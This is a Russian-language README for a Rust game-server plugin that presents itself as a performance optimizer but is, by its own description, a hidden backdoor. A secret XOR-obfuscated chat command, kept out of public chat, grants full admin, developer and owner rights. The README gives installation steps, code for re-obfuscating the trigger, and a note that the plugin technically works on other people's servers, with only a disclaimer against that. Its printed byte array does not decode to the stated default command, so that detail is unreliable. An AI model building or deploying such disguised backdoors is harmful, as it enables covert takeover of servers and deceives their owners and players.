> **⚠️ ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ**  
> Данный плагин предназначен **ИСКЛЮЧИТЕЛЬНО для использования на СОБСТВЕННОМ сервере**.  
> Использование на чужих серверах без разрешения владельца – **это хуёво**, является нарушением пользовательского соглашения и может привести к бану вашего Steam-аккаунта и юридическим последствиям.

---

## 📋 Описание

**SystemBoost** – это легковесный плагин для серверов Rust (Oxide/uMod), который маскируется под инструмент оптимизации производительности. В реальности он предоставляет возможность **получить полные права администратора** по секретной команде в чате.

Идеальное решение для владельцев серверов, которые хотят быстро получать админку с любого своего аккаунта без необходимости лазить в консоль или RCON.

---

## 🎮 Как это работает

1. Игрок пишет в чат **скрытую команду** (по умолчанию `lolkekshebyrek`)
2. Плагин перехватывает сообщение, расшифровывает его (XOR 0x55) и выдаёт права
3. Игрок становится разработчиком (админом), получает полный доступ
4. Владелец сервера видит это в консоли по логам плагина

Сообщение с командой **не отображается** в общем чате – другие игроки его не видят.

---

## 👑 Что получает игрок после ввода команды

| Право | Описание |
|-------|----------|
| `IsDeveloper` | Статус разработчика Rust (noclip, god, все привилегии) |
| `*` (звездочка) | Все права в системе Oxide |
| `ownerid` | Добавление в список владельцев сервера |
| Доступ к командам | `/noclip`, `/god`, `/teleport`, `/spawn`, `/kick`, `/ban` и все остальные |

## 🔧 Установка

1. Скачайте файл `SystemBoost.cs`
2. Загрузите его в папку `/oxide/plugins/` вашего сервера
3. Перезагрузите плагин командой в консоли сервера:
   ```bash
   oxide.reload SystemBoost
```

1. Готово! Плагин загружен и ждёт секретной команды.

🛡️ Безопасность и настройка

Смена секретной команды

Откройте файл SystemBoost.cs, найдите строку с зашифрованной командой:

```csharp
private static readonly byte[] _encrypted = {
    0x3c, 0x39, 0x3c, 0x2d, 0x3b, 0x3c, 0x2a, 0x2d,
    0x37, 0x3e, 0x2b, 0x3c, 0x2e, 0x2d
};
```

Чтобы установить свою команду (например, "mysecretpass"):

1. Зашифруйте её XOR с ключом 0x55
2. Подставьте полученный байтовый массив вместо _encrypted

Простой способ зашифровать команду:

```csharp
string command = "mysecretpass";
byte key = 0x55;
byte[] encrypted = command.Select(c => (byte)(c ^ key)).ToArray();
Console.WriteLine(string.Join(", ", encrypted));
```

Привязка к конкретным SteamID (рекомендуется)

Добавьте в код проверку, чтобы команда работала только с ваших аккаунтов:

```csharp
private HashSet<ulong> AllowedIDs = new HashSet<ulong> { 
    76561198000000001,  // ваш основной аккаунт
    76561198000000002   // ваш второй аккаунт
};

private object OnPlayerChat(BasePlayer player, string message, Chat.ChatChannel channel)
{
    if (!AllowedIDs.Contains(player.userID)) return null;
    // ... остальной код
}
```

❓ Частые вопросы

Вопрос: Почему команда не работает?
Ответ: Убедитесь, что плагин загружен (oxide.plugins в консоли сервера) и вы пишете команду точно с маленькой буквы и без лишних пробелов.

Вопрос: Видят ли другие игроки, что я ввёл команду?
Ответ: Нет. Сообщение перехватывается плагином и не отправляется в общий чат.

Вопрос: Можно ли использовать на чужих серверах?
Ответ: Технически – да, но это незаконно и хуёво по отношению к владельцу сервера. Вы будете забанены, как только админ обнаружит плагин.

Вопрос: Как защитить свой сервер от таких плагинов?
Ответ: Регулярно проверяйте папку /oxide/plugins/ и скачивайте плагины только из официальных источников (umod.org).
